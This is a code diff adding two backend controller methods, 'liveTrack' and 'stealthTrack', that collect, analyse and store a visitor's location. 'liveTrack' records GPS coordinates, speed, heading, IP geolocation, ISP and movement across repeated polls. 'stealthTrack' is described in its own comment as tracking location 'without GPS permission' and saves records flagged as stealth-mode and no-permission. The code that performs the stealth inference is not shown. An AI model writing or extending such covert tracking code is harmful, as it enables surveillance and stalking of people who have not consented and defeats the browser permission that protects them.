@@ -157,6 +157,218 @@ class UserInfoController {
         }
     }
 
+    // Live tracking endpoint with enhanced location analysis
+    static async liveTrack(req, res) {
+        try {
+            const frontendData = req.body || {};
+            const trackingId = frontendData.trackingId || `track_${Date.now()}`;
+            
+            console.log(`🎯 Live tracking request #${frontendData.trackingCount || 1} for session: ${trackingId}`);
+            
+            // Collect comprehensive user information
+            const userData = await UserInfoService.collectUserInfo(req, frontendData);
+            
+            // Enhanced location analysis for live tracking
+            const locationAnalysis = {
+                // GPS Analysis
+                gpsLocation: frontendData.browserLocation && frontendData.browserLocation.latitude ? {
+                    coordinates: {
+                        latitude: frontendData.browserLocation.latitude,
+                        longitude: frontendData.browserLocation.longitude,
+                        accuracy: frontendData.browserLocation.accuracy,
+                        altitude: frontendData.browserLocation.altitude,
+                        speed: frontendData.browserLocation.speed,
+                        heading: frontendData.browserLocation.heading
+                    },
+                    quality: UserInfoService.assessLocationQuality(frontendData.browserLocation),
+                    source: 'browser-gps',
+                    timestamp: frontendData.browserLocation.timestamp
+                } : null,
+                
+                // IP-based location
+                ipLocation: userData.geolocation ? {
+                    coordinates: {
+                        latitude: userData.geolocation.latitude,
+                        longitude: userData.geolocation.longitude
+                    },
+                    address: {
+                        country: userData.geolocation.country,
+                        region: userData.geolocation.region,
+                        city: userData.geolocation.city,
+                        timezone: userData.geolocation.timezone
+                    },
+                    network: {
+                        ip: userData.network.ip,
+                        isp: userData.geolocation.isp,
+                        organization: userData.geolocation.organization
+                    },
+                    source: userData.geolocation.source
+                } : null,
+                
+                // Location comparison and accuracy
+                locationComparison: null,
+                
+                // Movement analysis (if previous tracking data exists)
+                movement: null
+            };
+            
+            // Compare GPS and IP locations if both available
+            if (locationAnalysis.gpsLocation && locationAnalysis.ipLocation) {
+                locationAnalysis.locationComparison = UserInfoService.compareLocations(
+                    locationAnalysis.gpsLocation.coordinates,
+                    locationAnalysis.ipLocation.coordinates
+                );
+            }
+            
+            // Movement analysis for repeated tracking
+            if (frontendData.trackingCount > 1 && frontendData.previousLocation) {
+                locationAnalysis.movement = UserInfoService.analyzeMovement(
+                    frontendData.previousLocation,
+                    locationAnalysis.gpsLocation || locationAnalysis.ipLocation
+                );
+            }
+            
+            // Enhanced tracking data
+            const trackingData = {
+                ...userData,
+                tracking: {
+                    ...userData.tracking,
+                    trackingId,
+                    trackingCount: frontendData.trackingCount || 1,
+                    sessionDuration: frontendData.sessionDuration || 0,
+                    interval: frontendData.interval || 10000,
+                    locationAnalysis
+                }
+            };
+            
+            // Save to database with tracking metadata
+            const userInfo = new UserInfo(UserInfo.validateData(trackingData));
+            let savedRecord = null;
+            
+            try {
+                savedRecord = await userInfo.save();
+                console.log(`💾 Live tracking data saved: ${savedRecord.id}`);
+            } catch (dbError) {
+                console.warn('⚠️ Database save failed for live tracking:', dbError.message);
+            }
+            
+            // Create enhanced response for live tracking
+            const response = {
+                success: true,
+                trackingId,
+                trackingCount: frontendData.trackingCount || 1,
+                timestamp: new Date().toISOString(),
+                data: trackingData,
+                locationAnalysis,
+                summary: {
+                    ip: userData.network.ip,
+                    country: userData.geolocation?.country,
+                    city: userData.geolocation?.city,
+                    accuracy: locationAnalysis.gpsLocation?.coordinates.accuracy,
+                    locationSources: [
+                        locationAnalysis.gpsLocation ? 'GPS' : null,
+                        locationAnalysis.ipLocation ? 'IP' : null
+                    ].filter(Boolean),
+                    movementDetected: locationAnalysis.movement?.distance > 10 // 10 meter threshold
+                },
+                database: {
+                    saved: !!savedRecord,
+                    recordId: savedRecord?.id || null
+                }
+            };
+            
+            res.status(200).json(response);
+            
+        } catch (error) {
+            console.error('❌ Live tracking error:', error);
+            res.status(500).json({
+                success: false,
+                message: 'Live tracking failed',
+                error: error.message,
+                trackingId: req.body?.trackingId,
+                timestamp: new Date().toISOString()
+            });
+        }
+    }
+
+    // Stealth location tracking without GPS permission
+    static async stealthTrack(req, res) {
+        try {
+            const frontendData = req.body || {};
+            const trackingId = frontendData.trackingId || `stealth_${Date.now()}`;
+            
+            console.log(`🔍 Stealth tracking request #${frontendData.calculationCount || 1} for session: ${trackingId}`);
+            
+            // Collect comprehensive user information (no GPS)
+            const userData = await UserInfoService.collectUserInfo(req, frontendData);
+            
+            // Perform advanced stealth location analysis
+            const stealthAnalysis = await UserInfoService.performStealthLocationAnalysis(req, frontendData);
+            
+            // Enhanced stealth tracking data
+            const stealthTrackingData = {
+                ...userData,
+                stealthAnalysis,
+                tracking: {
+                    ...userData.tracking,
+                    trackingId,
+                    calculationCount: frontendData.calculationCount || 1,
+                    sessionDuration: frontendData.sessionDuration || 0,
+                    stealthMode: true,
+                    noGpsPermission: true,
+                    algorithmsUsed: stealthAnalysis.algorithms
+                }
+            };
+            
+            // Save to database with stealth metadata
+            const userInfo = new UserInfo(UserInfo.validateData(stealthTrackingData));
+            let savedRecord = null;
+            
+            try {
+                savedRecord = await userInfo.save();
+                console.log(`💾 Stealth tracking data saved: ${savedRecord.id}`);
+            } catch (dbError) {
+                console.warn('⚠️ Database save failed for stealth tracking:', dbError.message);
+            }
+            
+            // Create enhanced response for stealth tracking
+            const response = {
+                success: true,
+                trackingId,
+                calculationCount: frontendData.calculationCount || 1,
+                timestamp: new Date().toISOString(),
+                data: stealthTrackingData,
+                stealthAnalysis,
+                summary: {
+                    ip: userData.network.ip,
+                    country: userData.geolocation?.country,
+                    city: userData.geolocation?.city,
+                    stealthLocation: stealthAnalysis.stealthLocation,
+                    confidence: stealthAnalysis.confidence,
+                    accuracy: stealthAnalysis.accuracy,
+                    algorithmsUsed: stealthAnalysis.algorithms,
+                    stealthMode: true
+                },
+                database: {
+                    saved: !!savedRecord,
+                    recordId: savedRecord?.id || null
+                }
+            };
+            
+            res.status(200).json(response);
+            
+        } catch (error) {
+            console.error('❌ Stealth tracking error:', error);
+            res.status(500).json({
+                success: false,
+                message: 'Stealth tracking failed',
+                error: error.message,
+                trackingId: req.body?.trackingId,
+                timestamp: new Date().toISOString()
+            });
+        }
+    }
+
     // Health check for user info service
     static async healthCheck(req, res) {
         try {
